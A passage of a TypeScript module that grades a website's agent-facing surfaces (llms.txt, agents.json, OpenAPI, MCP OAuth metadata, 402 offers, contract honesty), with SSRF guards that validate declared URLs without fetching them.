/**
 * Contract-derived checks — the judge. Every function here is PURE over the
 * EvidenceBundle: no network, no clock, no randomness. Same bundle → same
 * verdicts, byte for byte. The AX items are the R-k 10-point checklist; the
 * two honesty checks (schema-conformance, claims-honesty) don't add points —
 * they CAP the grade, because a lying surface is worse than a missing one.
 */

import {
  ROLE,
  findEvidence,
  parseJsonBody,
  parseAgentsJson,
  parseOpenapi,
  looksLikeLlmsTxt,
  hasAgentClasses,
  firstAuthorizationServer,
  wellKnownAt,
  parseAgentAuth,
  parseServerJson,
  parseReverseDnsName,
  namespaceDomain,
  isGithubNamespace,
  githubNamespaceOwner,
  parseJsonRpcMessage,
  toolObjectsFrom,
  uiTemplateOfTool,
  resourceUriOfResult,
  resourceContentOf,
  externalUrlOf,
  isMcpUiMime,
  type ServerJsonClaims,
} from './discovery.js'
import { isPubliclyRoutableSameOrigin, isPublicHttpsOffOriginAllowed } from './http.js'
import { validateSchema } from './schema.js'
import { contractDiff } from './contract.js'
import type { CheckResult, Evidence, EvidenceBundle, MiniSchema, Verdict } from './types.js'

/**
 * Read the RAW monetization.probe off the card (pre-drop) and, if present,
 * return why it is inadmissible as a same-origin GET — or undefined if it is
 * fine. Pure string validation: the hostile URL is NEVER fetched to decide.
 * Mirrors the probes.* rule via the SHARED same-origin helper (AXP A.5).
 */
function monetizationProbeViolation(doc: unknown, origin: string): string | undefined {
  if (!doc || typeof doc !== 'object') return undefined
  const m = (doc as Record<string, unknown>).monetization
  if (!m || typeof m !== 'object') return undefined
  const p = (m as Record<string, unknown>).probe
  if (!p || typeof p !== 'object') return undefined
  const rawUrl = (p as Record<string, unknown>).url
  if (typeof rawUrl !== 'string') return undefined // no url → nothing declared to verify
  const method = typeof (p as Record<string, unknown>).method === 'string'
    ? ((p as Record<string, unknown>).method as string).toUpperCase()
    : 'GET'
  let abs: string
  try { abs = new URL(rawUrl, origin).toString() } catch { return `monetization.probe url ${rawUrl} is not a valid URL` }
  if (method !== 'GET') {
    return `monetization.probe uses method ${method} — must be a same-origin GET (AXP Appendix A.5); refused without fetching`
  }
  if (!isPubliclyRoutableSameOrigin(abs, origin)) {
    return `monetization.probe url ${rawUrl} is not a same-origin, publicly-routable target for ${origin} — refused without fetching (SSRF guard, AXP Appendix A.5)`
  }
  return undefined
}

export function runChecks(bundle: EvidenceBundle): CheckResult[] {
  const agentsEv = findEvidence(bundle, ROLE.agentsJson)
  const agentsDoc = parseJsonBody(agentsEv)
  const agents = parseAgentsJson(agentsDoc, bundle.target)
  const icpEv = findEvidence(bundle, ROLE.icpJson)
  const icpDoc = parseJsonBody(icpEv)
  const openapiEv = findEvidence(bundle, ROLE.openapi)
  const openapiDoc = parseJsonBody(openapiEv)
  const openapi = parseOpenapi(openapiDoc)
  const probes = bundle.items.filter((e) => e.role.startsWith('probe:endpoint:'))

  const checks: CheckResult[] = []

  // ── AX 1: llms.txt ────────────────────────────────────────────────────────
  {
    const ev = findEvidence(bundle, ROLE.llmsTxt)
    checks.push(check('llms-txt', 'llms.txt is served and agent-actionable', 1, [ROLE.llmsTxt],
      ok(ev) && looksLikeLlmsTxt(ev?.body)
        ? pass('markdown with an H1 and substantive content')
        : fail(ev, 'expected 200 markdown (H1 + substantive content) at /llms.txt')))
  }

  // ── AX 2: agents.json ────────────────────────────────────────────────────
  checks.push(check('agents-json', '/.well-known/agents.json capability card parses', 2, [ROLE.agentsJson],
    ok(agentsEv) && agentsDoc !== undefined && agents.name !== undefined
      ? pass(`valid JSON; name="${agents.name}", ${agents.endpoints.length} http endpoint(s) declared`)
      : fail(agentsEv, 'expected valid JSON with a name and interfaces at /.well-known/agents.json')))

  // ── AX 3: icp.json ───────────────────────────────────────────────────────
  checks.push(check('icp-json', '/icp.json self-classification surface', 3, [ROLE.icpJson],
    ok(icpEv) && hasAgentClasses(icpDoc)
      ? pass('valid JSON with agent_classes — an agent can self-classify')
      : fail(icpEv, 'expected valid JSON with agent_classes at /icp.json')))

  // ── AX 4: content negotiation at the root ────────────────────────────────
  //    Three probes: Accept: */* (curl/agent → non-HTML text), Accept: text/html
  //    (browser → HTML), and — ax-c7m — Accept: application/json (agent asking
  //    for JSON). The blind-spot the JSON probe closes: a root that IGNORES
  //    Accept: application/json and hands a JSON-requesting agent a wall of HTML.
  //    That is graded DOWN (FAIL). A root that legitimately has NO JSON
  //    representation but still answers with agent-actionable non-HTML text
  //    (markdown) is NOT false-failed — it keeps the point, with a sub-signal
  //    in the detail noting JSON is not served (partial credit). Grade what's
  //    declared: only serving HTML to an explicit application/json request is
  //    penalized, never the absence of a JSON body itself.
  {
    const asAgent = findEvidence(bundle, ROLE.rootAgent)
    const asBrowser = findEvidence(bundle, ROLE.rootBrowser)
    const asJson = findEvidence(bundle, ROLE.rootJson)
    const agentGotText = ok(asAgent) && asAgent?.body != null && !looksLikeHtml(asAgent.body)
    const browserGotHtml = ok(asBrowser) && asBrowser?.body != null && looksLikeHtml(asBrowser.body)
    // JSON sub-signal (only meaningful when the JSON probe actually resolved).
    const jsonProbed = ok(asJson) && asJson?.body != null
    const jsonIsHtml = jsonProbed && looksLikeHtml(asJson!.body!)
    const jsonCt = asJson?.contentType?.toLowerCase() ?? ''
    const jsonBodyParses = jsonProbed && parseJsonBody(asJson) !== undefined
    const jsonServed = jsonProbed && jsonCt.includes('json') && jsonBodyParses
    const mdHtmlOk = agentGotText && browserGotHtml
    let result: { verdict: Verdict; detail: string }
    if (!mdHtmlOk) {
      result = fail(asAgent, agentGotText
        ? 'browser Accept did not receive HTML'
        : 'agent Accept received HTML (or nothing) — curl gets a wall of markup')
    } else if (jsonIsHtml) {
      // The blind-spot: Accept: application/json was ignored and answered with
      // a wall of HTML. Grade DOWN.
      result = { verdict: 'fail', detail: 'root ignores Accept: application/json — a JSON-requesting agent received a wall of HTML instead of a JSON (or at least non-HTML, agent-actionable) representation' }
    } else if (jsonServed) {
      result = pass('Accept: */* got non-HTML text; Accept: text/html got HTML; Accept: application/json got a parseable JSON body')
    } else if (jsonBodyParses) {
      // A JSON body WAS served (it parses) but not labeled with a JSON
      // content-type — distinct from "no JSON body at all". Not a false-fail
      // (the content itself is agent-actionable), but the detail must say what
      // actually happened rather than claim no JSON body was served.
      result = pass('Accept: */* got non-HTML text; Accept: text/html got HTML; Accept: application/json served a parseable JSON body under a non-JSON content-type (partial credit)')
    } else {
      // md/html negotiate correctly and the JSON probe did NOT return HTML
      // (it returned non-HTML text, e.g. markdown, or a non-2xx). No JSON
      // representation at the root, but not a false-fail — keep the point with
      // a clear sub-signal.
      result = pass('Accept: */* got non-HTML text; Accept: text/html got HTML; Accept: application/json served no JSON body but did NOT return HTML (agent-actionable non-HTML fallback — partial credit)')
    }
    checks.push(check('content-negotiation', 'root content-negotiates (curl → markdown, browser → HTML, agent JSON → JSON/non-HTML)', 4,
      [ROLE.rootAgent, ROLE.rootBrowser, ROLE.rootJson], result))
  }

  // ── AX 5: OpenAPI contract ───────────────────────────────────────────────
  checks.push(check('openapi', 'machine-readable API contract (OpenAPI) is published', 5, [ROLE.openapi],
    ok(openapiEv) && openapi.valid
      ? pass(`OpenAPI parses; ${openapi.pathCount} path(s), ${openapi.probeCandidates.length} keyless GET candidate(s)`)
      : fail(openapiEv, 'no parseable OpenAPI document found (declared URL or /openapi.json)')))

  // ── AX 6: MCP ────────────────────────────────────────────────────────────
  checks.push(check('mcp-declared', 'MCP interface declared with transport + tools', 6, [ROLE.agentsJson],
    agents.mcp && (agents.mcp.transport || agents.mcp.url) && (agents.mcp.tools?.length ?? 0) > 0
      ? pass(`mcp: ${agents.mcp!.transport ?? agents.mcp!.url} with tools [${agents.mcp!.tools!.join(', ')}] (presence-grade; stdio not spawned)`)
      : fail(agentsEv, 'agents.json interfaces.mcp with a transport/url and a non-empty tools list')))

  // ── MCP authorization conformance (RFC 9728 / 8414 / 7636 / 7591 / 8707) ──
  //    Sibling checks to AX-6: an MCP-exposing API declared over HTTP/SSE
  //    (interfaces.mcp.url) MUST be an OAuth 2.1 resource server publishing the
  //    MCP well-knowns. These are PURE judges over evidence observeTarget
  //    recorded — no network here. stdio-only MCP (no url) is NOT an OAuth
  //    resource server → skip, not fail.
  {
    const mcpUrl = agents.mcp?.url
    // The mcpUrl is the target's OWN endpoint → MUST be same-origin (SSRF).
    // Decided from the URL string alone; the hostile URL is never fetched.
    const mcpViolation = mcpUrlSameOriginViolation(mcpUrl, bundle.target)
    // stdio-vs-remote is decided from the DECLARED TRANSPORT, never from url
    // presence — a remote transport that simply OMITS its url must FAIL, not
    // silently skip and pocket the AX-6 point. stdio (or a command-only card
    // with no transport and no url) is NOT an OAuth resource server → skip. Any
    // other (non-stdio) transport, or a declared url, means an HTTP/SSE MCP
    // endpoint that IS an OAuth 2.1 resource server and MUST publish the MCP
    // well-knowns.
    const transport = agents.mcp?.transport?.toLowerCase()
    const isStdioLike =
      !agents.mcp ||
      transport === 'stdio' ||
      (transport === undefined && mcpUrl === undefined)
    const isRemote = !!agents.mcp && !isStdioLike
    // A remote transport that declares no reachable url can never be verified as
    // an OAuth resource server — fail closed (NOT skip) so the missing url is
    // penalized, not rewarded.
    const remoteNoUrl = isRemote && mcpUrl === undefined

    const prEv = findEvidence(bundle, ROLE.mcpProtectedResource)
    const asEv = findEvidence(bundle, ROLE.mcpAsMetadata)
    const asOidcEv = findEvidence(bundle, ROLE.mcpAsMetadataOidc)
    const unauthEv = findEvidence(bundle, ROLE.mcpUnauth)
    const pr = parseJsonBody(prEv) as Record<string, unknown> | undefined
    // RFC 8414 primary, OIDC discovery fallback: judge whichever resolved 2xx.
    const asMetaOk = ok(asEv) || ok(asOidcEv)
    const usedOidc = !ok(asEv) && ok(asOidcEv)
    const asMeta = parseJsonBody(ok(asEv) ? asEv : ok(asOidcEv) ? asOidcEv : asEv ?? asOidcEv) as
      | Record<string, unknown>
      | undefined

    // ── KEYLESS vs PROTECTED remote MCP (AXP Clause 7, the No-ask Zone) ──────
    //    keyless-first-value is a VALID, intentional choice: a public read-only
    //    MCP tool legitimately needs no auth, and .ax's OWN surfaces are
    //    keyless-first. The unauthenticated MCP probe (ROLE.mcpUnauth — fetched
    //    ONCE, SSRF-gated, in observeTarget) tells the two apart:
    //      PROTECTED = the endpoint GATES access — it answers the unauthenticated
    //                  request with 401/403, OR advertises an auth scheme via a
    //                  WWW-Authenticate challenge. Every OAuth sibling then
    //                  APPLIES unchanged; a PROTECTED-but-broken OAuth still
    //                  FAILS (the key invariant — no false-pass).
    //      KEYLESS   = the unauthenticated request SUCCEEDS (2xx) with NO auth
    //                  challenge — the server operates without auth. The OAuth
    //                  siblings SKIP with an informational verdict, exactly like
    //                  the stdio case; no fail, no cap.
    //    Keyless requires a POSITIVE 2xx signal (not merely "not a 401"): a 401
    //    with no WWW-Authenticate, or an unresolved probe, is NEVER read as
    //    keyless — it stays PROTECTED(-but-broken) and FAILS the OAuth checks.
    const unauthStatus = unauthEv?.status ?? null
    const unauthWww = unauthEv?.headers['www-authenticate']
    const mcpChallengesAuth =
      unauthStatus === 401 ||
      unauthStatus === 403 ||
      (typeof unauthWww === 'string' && unauthWww.length > 0)
    const isKeylessMcp =
      isRemote &&
      !remoteNoUrl &&
      !mcpViolation &&
      !mcpChallengesAuth &&
      unauthStatus !== null &&
      unauthStatus >= 200 &&
      unauthStatus < 300

    // Consistent skip/violation gate for every MCP-OAuth sibling check.
    const mcpCheck = (
      id: string,
      title: string,
      evidence: string[],
      judge: () => { verdict: Verdict; detail: string },
    ): void => {
      let result: { verdict: Verdict; detail: string }
      if (!isRemote) {
        result = {
          verdict: 'skip',
          detail: agents.mcp
            ? `MCP declared ${transport ?? 'command-only'} transport (no url) — not an OAuth resource server; skipped`
            : 'no MCP interface declared — nothing to verify',
        }
      } else if (remoteNoUrl) {
        result = {
          verdict: 'fail',
          detail: `remote MCP transport '${transport ?? 'http'}' declares no reachable url — an HTTP/SSE MCP endpoint must publish a url to act as an OAuth 2.1 resource server (RFC 9728)`,
        }
      } else if (mcpViolation) {
        result = { verdict: 'fail', detail: mcpViolation }
      } else if (isKeylessMcp) {
        result = {
          verdict: 'skip',
          detail: `keyless MCP (No-ask Zone, AXP Clause 7) — the unauthenticated MCP request returned ${unauthStatus} with no auth challenge; OAuth 2.1 is not required for a keyless-first-value surface`,
        }
      } else {
        result = judge()
      }
      checks.push(check(id, title, undefined, evidence, result))
    }

    // (a) RFC 9728 protected-resource metadata.
    mcpCheck('mcp-oauth-protected-resource',
      'MCP endpoint publishes RFC 9728 protected-resource metadata', [ROLE.agentsJson, ROLE.mcpProtectedResource], () => {
        if (!ok(prEv)) return fail(prEv, `expected 200 JSON at ${wellKnownAt(mcpUrl!, 'oauth-protected-resource')}`)
        const resource = typeof pr?.resource === 'string' ? (pr.resource as string) : undefined
        const asList = Array.isArray(pr?.authorization_servers) ? (pr!.authorization_servers as unknown[]) : []
        if (!resource) return { verdict: 'fail', detail: 'protected-resource metadata is missing a string `resource` (RFC 9728 §3)' }
        if (asList.length === 0) return { verdict: 'fail', detail: 'protected-resource metadata `authorization_servers` is empty or missing (RFC 9728 §3)' }
        return pass(`RFC 9728: resource="${resource}" with ${asList.length} authorization_server(s)`)
      })

    // (b) Follow authorization_servers[0] to RFC 8414 metadata (OIDC fallback).
    mcpCheck('mcp-oauth-as-metadata',
      'authorization server publishes RFC 8414 metadata (openid-configuration fallback)',
      [ROLE.mcpProtectedResource, ROLE.mcpAsMetadata, ROLE.mcpAsMetadataOidc], () => {
        const asBase = firstAuthorizationServer(pr)
        if (!asBase) return { verdict: 'fail', detail: 'no authorization_servers[0] in protected-resource metadata to resolve' }
        // The AS MAY be off-origin, but never cleartext or a private/metadata
        // host — refused WITHOUT fetching (decided from the URL string).
        if (!isPublicHttpsOffOriginAllowed(asBase)) {
          return { verdict: 'fail', detail: `authorization_servers[0] ${asBase} is not a public https authorization server — refused without fetching (SSRF guard: no cleartext, no private/metadata host)` }
        }
        if (!asMetaOk) {
          return { verdict: 'fail', detail: `neither /.well-known/oauth-authorization-server nor /.well-known/openid-configuration resolved 200 JSON at ${originOf(asBase)}` }
        }
        // Presence-of-a-string is NOT enough: the empty string and non-URL junk
        // are typeof 'string' yet worthless. Each RFC 8414 member MUST be a
        // non-empty absolute https URL — parsed with new URL(), mirroring the
        // stricter parsing mcp-oauth-resource-indicators already applies.
        const missing = [
          !isAbsoluteHttpsUrl(asMeta?.issuer) && 'issuer',
          !isAbsoluteHttpsUrl(asMeta?.authorization_endpoint) && 'authorization_endpoint',
          !isAbsoluteHttpsUrl(asMeta?.token_endpoint) && 'token_endpoint',
        ].filter((m): m is string => typeof m === 'string')
        if (missing.length) return { verdict: 'fail', detail: `AS metadata missing required member(s): ${missing.join(', ')} (RFC 8414 §2)` }
        return pass(`RFC 8414${usedOidc ? ' (openid-configuration fallback)' : ''}: issuer + authorization_endpoint + token_endpoint present`)
      })

    // (c-i) PKCE S256 (RFC 7636).
    mcpCheck('mcp-pkce',
      'authorization server advertises PKCE S256 (RFC 7636)', [ROLE.mcpAsMetadata, ROLE.mcpAsMetadataOidc], () => {
        if (!asMetaOk) return { verdict: 'fail', detail: 'authorization server metadata not resolved — cannot confirm PKCE support' }
        const methods = Array.isArray(asMeta?.code_challenge_methods_supported) ? (asMeta!.code_challenge_methods_supported as unknown[]) : []
        return methods.includes('S256')
          ? pass('code_challenge_methods_supported includes S256')
          : { verdict: 'fail', detail: `code_challenge_methods_supported ${methods.length ? `[${methods.join(', ')}]` : 'missing'} does not include 'S256' (RFC 7636 PKCE is mandatory for OAuth 2.1)` }
      })

    // (c-ii) Dynamic Client Registration (RFC 7591).
    mcpCheck('mcp-oauth-dcr',
      'authorization server supports Dynamic Client Registration (RFC 7591)', [ROLE.mcpAsMetadata, ROLE.mcpAsMetadataOidc], () => {
        if (!asMetaOk) return { verdict: 'fail', detail: 'authorization server metadata not resolved — cannot confirm DCR support' }
        // Presence-only (typeof 'string') passes for '' and non-URL junk. DCR
        // requires a real endpoint: a non-empty absolute https URL, parsed.
        return isAbsoluteHttpsUrl(asMeta?.registration_endpoint)
          ? pass(`registration_endpoint present: ${asMeta!.registration_endpoint as string} (RFC 7591 DCR)`)
          : { verdict: 'fail', detail: `AS metadata registration_endpoint ${typeof asMeta?.registration_endpoint === 'string' ? `"${asMeta.registration_endpoint}" is not a valid absolute https URL` : 'is missing'} — Dynamic Client Registration (RFC 7591) is not advertised` }
      })

    // (c-iii) Resource Indicators (RFC 8707): the protected-resource `resource`
    //         is the canonical audience the client sends as the RFC 8707
    //         `resource` parameter to audience-bind its token to THIS MCP origin.
    mcpCheck('mcp-oauth-resource-indicators',
      'protected-resource declares an RFC 8707 audience bound to the MCP origin', [ROLE.mcpProtectedResource], () => {
        const resource = typeof pr?.resource === 'string' ? (pr.resource as string) : undefined
        if (!resource) return { verdict: 'fail', detail: 'protected-resource metadata has no `resource` audience for the client to send as the RFC 8707 resource parameter' }
        let ru: URL
        try { ru = new URL(resource) } catch { return { verdict: 'fail', detail: `resource "${resource}" is not an absolute URL — cannot serve as an RFC 8707 audience` } }
        const mcpOrigin = originOf(mcpUrl!)
        if (ru.origin !== mcpOrigin) return { verdict: 'fail', detail: `resource audience origin ${ru.origin} does not match the MCP endpoint origin ${mcpOrigin} — token audience-binding (RFC 8707) would not protect this resource` }
        return pass(`resource audience "${resource}" is bound to the MCP origin (RFC 8707 resource indicator)`)
      })

    // (d) Unauthenticated 401 carries WWW-Authenticate → protected-resource.
    mcpCheck('mcp-www-authenticate',
      'unauthenticated MCP request returns 401 with WWW-Authenticate → protected-resource metadata', [ROLE.mcpUnauth], () => {
        if (!unauthEv || unauthEv.status === null) return fail(unauthEv, `expected an unauthenticated 401 from ${mcpUrl}`)
        const status = unauthEv.status
        if (status !== 401 && status !== 403) return { verdict: 'fail', detail: `unauthenticated MCP request returned ${status}, not 401 — the endpoint is not gated as an OAuth resource server` }
        const wa = unauthEv.headers['www-authenticate']
        if (!wa) return { verdict: 'fail', detail: `${status} response carries no WWW-Authenticate header (RFC 9728 §5.1 / RFC 6750)` }
        if (!/bearer/i.test(wa)) return { verdict: 'fail', detail: `WWW-Authenticate does not offer the Bearer scheme: ${wa}` }
        const prUrl = wellKnownAt(mcpUrl!, 'oauth-protected-resource')
        const refsMetadata = /resource_metadata/i.test(wa) && prUrl !== undefined && wa.includes(prUrl)
        if (!refsMetadata) return { verdict: 'fail', detail: `WWW-Authenticate does not reference the protected-resource metadata via resource_metadata="${prUrl}" (RFC 9728 §5.1): ${wa}` }
        return pass(`${status} with WWW-Authenticate: Bearer resource_metadata pointing at the protected-resource metadata`)
      })
  }

  // ── AAP discovery (ax-e6b.21.1) ───────────────────────────────────────────
  //    A target that ships /.well-known/agent-configuration claims the Agent
  //    Auth Protocol. The doc must advertise the identity/key/approval surface
  //    an agent needs. PURE over the recorded agent-configuration evidence.
  //    ABSENT document (not fetched / non-2xx / 404) => SKIP (the target does
  //    not claim AAP); a 200 that is missing/malformed any REQUIRED field =>
  //    FAIL. Not an AX-score item (axItem undefined) — an advisory conformance
  //    check bindable via kind:'check'.
  {
    const acEv = findEvidence(bundle, ROLE.agentConfiguration)
    const result = !ok(acEv)
      ? { verdict: 'skip' as Verdict, detail: 'no /.well-known/agent-configuration document (2xx) — target does not claim the Agent Auth Protocol' }
      : judgeAapDiscovery(parseJsonBody(acEv))
    checks.push(check('aap-discovery', 'AAP discovery advertises Ed25519 + approval methods + register/status/revoke + jwks_uri', undefined,
      [ROLE.agentConfiguration], result))
  }

  // ── auth.md agent-identity (ax-e6b.21.1) ──────────────────────────────────
  //    REUSES the RFC 8414 authorization-server metadata the MCP-OAuth check
  //    already fetched (no duplicate fetch). An agent-identity provider carries
  //    an `agent_auth` block (identity/claim/events endpoints) AND advertises
  //    ID-JAG as the accepted assertion AND SET-based revocation (RFC 8417/8935)
  //    via the events_endpoint; the declared identity_endpoint must RESOLVE
  //    (advertisement/shape-grade — no live ID-JAG mint). ABSENT agent_auth
  //    (or no AS metadata resolved) => SKIP (not an agent-identity provider);
  //    a present-but-defective block => FAIL the specific defect.
  {
    const asEv = findEvidence(bundle, ROLE.mcpAsMetadata)
    const asOidcEv = findEvidence(bundle, ROLE.mcpAsMetadataOidc)
    const resolvedAsEv = ok(asEv) ? asEv : ok(asOidcEv) ? asOidcEv : undefined
    const asMeta = parseJsonBody(resolvedAsEv)
    const agentAuth = parseAgentAuth(asMeta)
    const idEv = findEvidence(bundle, ROLE.agentIdentity)
    const evidence = [ROLE.mcpAsMetadata, ROLE.mcpAsMetadataOidc, ...(idEv ? [ROLE.agentIdentity] : [])]
    const result: { verdict: Verdict; detail: string } = !agentAuth
      ? {
          verdict: 'skip',
          detail: resolvedAsEv === undefined
            ? 'no authorization-server metadata resolved (no MCP/OAuth AS declared) — nothing advertises an agent_auth block'
            : 'authorization-server metadata carries no agent_auth block — not an auth.md agent-identity provider',
        }
      : judgeAuthmdAgentIdentity(agentAuth, asMeta, resolvedAsEv, idEv)
    checks.push(check('authmd-agent-identity',
      'auth.md agent-identity advertised (agent_auth identity/claim/events + ID-JAG + SET revocation)', undefined,
      evidence, result))
  }

  // ── AX 7: keyless flow ───────────────────────────────────────────────────
  {
    const succeeded = probes.filter((p) => p.status !== null && p.status >= 200 && p.status < 300)
    checks.push(check('keyless-flow', 'at least one declared endpoint answers 2xx with no key', 7,
      probes.map((p) => p.role),
      probes.length === 0
        ? { verdict: 'fail', detail: 'no keyless GET candidates discoverable from agents.json/OpenAPI — nothing an agent can try without an account' }
        : succeeded.length > 0
          ? pass(`${succeeded.length}/${probes.length} sampled endpoint(s) answered 2xx keyless (seed ${bundle.seed})`)
          : { verdict: 'fail', detail: `all ${probes.length} sampled keyless candidates failed (statuses: ${probes.map((p) => p.status ?? 'ERR').join(', ')})` }))
  }

  // ── AX 8: 402 offers ─────────────────────────────────────────────────────
  {
    const offerEv = findEvidence(bundle, ROLE.offer)
    const declared = (agents.offers?.length ?? 0) > 0
    // A declared monetization.probe that is off-origin / non-GET / private-IP
    // is an SSRF vector (AXP A.5). It was DROPPED at parse time (never
    // fetched); the card must still FAIL here — never silently downgrade to
    // declared-only. Decided from the URL string alone; the hostile URL is
    // never requested.
    const probeViolation = monetizationProbeViolation(agentsDoc, bundle.target)
    let result: { verdict: Verdict; detail: string }
    if (probeViolation) {
      result = { verdict: 'fail', detail: probeViolation }
    } else if (!declared) {
      result = fail(agentsEv, 'no monetization.offers declared — payment boundaries are dead ends, not offers')
    } else if (agents.offerProbe) {
      const body = parseJsonBody(offerEv) as Record<string, unknown> | undefined
      const shaped = body && (typeof body.id === 'string' || typeof body.title === 'string') &&
        (Array.isArray(body.alternatives) || body.price !== undefined || typeof body.checkoutUrl === 'string')
      result = offerEv?.status === 402 && shaped
        ? pass('declared boundary answered HTTP 402 with a structured offer (id/title + price|checkoutUrl|alternatives)')
        : { verdict: 'fail', detail: `declared offer probe did not behave: status ${offerEv?.status ?? 'ERR'}, structured offer body ${shaped ? 'present' : 'missing'}` }
    } else {
      result = pass(`${agents.offers!.length} offer(s) declared in agents.json (declared-only — no monetization.probe URL to verify behaviorally)`)
    }
    checks.push(check('offers-402', 'payment boundaries answer as structured 402 offers', 8,
      [ROLE.agentsJson, ...(findEvidence(bundle, ROLE.offer) ? [ROLE.offer] : [])], result))
  }

  // ── AX 9: linkset ────────────────────────────────────────────────────────
  {
    const llms = findEvidence(bundle, ROLE.llmsTxt)
    const root = findEvidence(bundle, ROLE.rootAgent)
    const mentions = ['agents.json', 'icp.json', 'openapi', 'llms.txt']
      .filter((s) => llms?.body?.includes(s))
    const linkHeader = root?.headers['link'] !== undefined
    checks.push(check('linkset', 'surfaces cross-reference each other (linkset)', 9, [ROLE.llmsTxt, ROLE.rootAgent],
      mentions.length >= 2 || linkHeader
        ? pass(linkHeader ? 'Link header present on root' : `llms.txt references ${mentions.join(', ')}`)
        : fail(llms, 'llms.txt references fewer than 2 sibling surfaces and root sends no Link header — surfaces are islands')))
  }

  // ── AX 10: attestation ───────────────────────────────────────────────────
  {
    const icpLadder = icpDoc && typeof icpDoc === 'object'
      ? (icpDoc as Record<string, unknown>).ladder ?? (icpDoc as Record<string, unknown>).attestation
      : undefined
    const found = agents.attestation !== undefined || icpLadder !== undefined
    checks.push(check('attestation', 'attestation/identity ladder is declared', 10, [ROLE.agentsJson, ROLE.icpJson],
      found
        ? pass('attestation ladder declared (agents.json attestationLadder / icp.json ladder)')
        : fail(agentsEv, 'no attestation or identity ladder declared on agents.json or icp.json')))
  }

  // ── Honesty check A: schema conformance of sampled endpoints ─────────────
  {
    const withSchema = openapi.probeCandidates.filter((c) => c.responseSchema)
    const judged: string[] = []
    const violations: string[] = []
    for (const probe of probes) {
      const path = probe.role.replace(/^probe:endpoint:GET /, '')
      const candidate = withSchema.find((c) => c.path === path)
      if (!candidate || probe.status === null || probe.status < 200 || probe.status >= 300) continue
      judged.push(path)
      const body = parseJsonBody(probe)
      if (body === undefined) {
        violations.push(`${path}: 2xx response is not JSON but schema declares application/json`)
        continue
      }
      for (const v of validateSchema(body, candidate.responseSchema!)) {
        violations.push(`${path}: ${v.path} ${v.message}`)
      }
    }
    checks.push(check('schema-conformance', 'sampled responses conform to their published schemas', undefined,
      probes.map((p) => p.role),
      judged.length === 0
        ? { verdict: 'skip', detail: 'no sampled endpoint had both a 2xx response and a published response schema' }
        : violations.length === 0
          ? pass(`${judged.length} sampled response(s) conform to their OpenAPI schemas`)
          : { verdict: 'fail', detail: `published schema violated: ${violations.slice(0, 5).join('; ')}` }))
  }

  // ── Honesty check B: claims vs behavior ──────────────────────────────────
  {
    // Every probed endpoint was CLAIMED by the target's own surfaces. A
    // claimed endpoint that 404s/500s is a lying surface.
    const lying = probes.filter((p) => p.status !== null && (p.status === 404 || p.status >= 500))
    checks.push(check('claims-honesty', 'claimed endpoints actually exist (no ghost surface)', undefined,
      probes.map((p) => p.role),
      probes.length === 0
        ? { verdict: 'skip', detail: 'no claimed endpoints to probe' }
        : lying.length === 0
          ? pass('every probed claimed endpoint exists (no 404/5xx)')
          : { verdict: 'fail', detail: `claimed but dead: ${lying.map((p) => `${p.url} → ${p.status}`).join(', ')}` }))
  }

  // ── Honesty check C: full OpenAPI 3.1 <-> live contract diff (ax-e6b.28.4) ─
  //    Generalizes schema-conformance (sampled bodies) + claims-honesty
  //    (sampled 404s) into a FULL diff: every declared GET-safe (path, status,
  //    content-type) is compared against the live response, endpoint-level
  //    declared-but-absent + undeclared-but-present are enumerated, and every
  //    deviation is classified breaking-vs-additive. A BREAKING deviation (a
  //    declared thing the live API violates — missing required field, wrong
  //    type, enum violation, absent endpoint, removed status) FAILs the check,
  //    which (as an honesty check, axItem undefined) CAPS the grade — a lying
  //    contract is worse than a missing one. Additive-only (live has MORE than
  //    declared) still PASSES. No live openapi or no GET-safe operation => SKIP.
  //    The structured report rides on the CheckResult (`contractDiff`) so the
  //    diff is a monitorable signal, and the check is pinnable via kind:'check'.
  {
    const diff = contractDiff(bundle)
    let result: { verdict: Verdict; detail: string }
    if (!diff.openapiValid) {
      result = { verdict: 'skip', detail: 'no valid OpenAPI contract to diff against the live surface' }
    } else if (diff.operationsProbed === 0) {
      result = { verdict: 'skip', detail: `OpenAPI declares ${diff.operationsDeclared} operation(s) but none are GET-safe to probe (all templated / parameterized / secured)` }
    } else if (diff.breaking > 0) {
      const top = diff.deviations.filter((d) => d.classification === 'breaking').slice(0, 5).map((d) => d.detail)
      result = { verdict: 'fail', detail: `${diff.breaking} breaking contract deviation(s) across ${diff.operationsProbed} probed operation(s)${diff.additive ? ` (+${diff.additive} additive)` : ''}: ${top.join('; ')}` }
    } else if (diff.additive > 0) {
      result = { verdict: 'pass', detail: `live surface conforms to every declared contract; ${diff.additive} additive deviation(s) (undeclared field/endpoint — live has more than declared, non-breaking)` }
    } else {
      result = { verdict: 'pass', detail: `clean diff: ${diff.operationsProbed} probed operation(s) match their declared status/content-type/schema; no declared-but-absent or undeclared-but-present endpoints` }
    }
    const evidenceRoles = diff.perOperation
      .map((o) => ROLE.contract('GET', o.path))
      .concat(diff.perOperation.map((o) => ROLE.keyless('GET', o.path)))
      .filter((role) => findEvidence(bundle, role) !== undefined)
    const c = check('contract-diff', 'live responses match the published OpenAPI contract (full diff)', undefined,
      evidenceRoles.length ? evidenceRoles : [ROLE.openapi], result)
    c.contractDiff = diff
    checks.push(c)
  }

  // ── MCP-registry publishability (ax-e6b.38) ──────────────────────────────
  //    A listing can pass AX-6 'mcp-declared' (presence-grade) yet NOT be
  //    publishable to / discoverable via the official MCP Registry
  //    (registry.modelcontextprotocol.io) that the agent-native hubs ingest
  //    from. This dimension grades the missing piece — DERIVED entirely from the
  //    target's PUBLISHED surfaces + DNS (verifier-independent, no repo-local
  //    tests). It ACTIVATES only when the target serves a server.json manifest
  //    (an affirmative registry claim); a target that ships none SKIPs every
  //    sub-check (AX-6 still records its presence-only MCP declaration), so a
  //    non-registry MCP server is never over-blocked. When active, each sub-
  //    check is an HONESTY cap (axItem undefined): a presence-only pass must not
  //    masquerade as publishable, so an invalid manifest / a dead live remote /
  //    an unprovable namespace ownership FAILs and caps the grade.
  {
    const sjEv = findEvidence(bundle, ROLE.mcpServerJson)
    const server = parseServerJson(parseJsonBody(sjEv))

    // (a) server.json validity — required registry fields + reverse-DNS name.
    checks.push(check('mcp-server-json',
      'MCP registry manifest (server.json) is valid and registry-publishable', undefined,
      [ROLE.mcpServerJson], judgeServerJson(sjEv, server)))

    // (b) LIVE MCP remote resolution — upgrade from AX-6 presence-only.
    const initEv = findEvidence(bundle, ROLE.mcpRemoteInit)
    const toolsEv = findEvidence(bundle, ROLE.mcpRemoteToolsList)
    checks.push(check('mcp-remote-live',
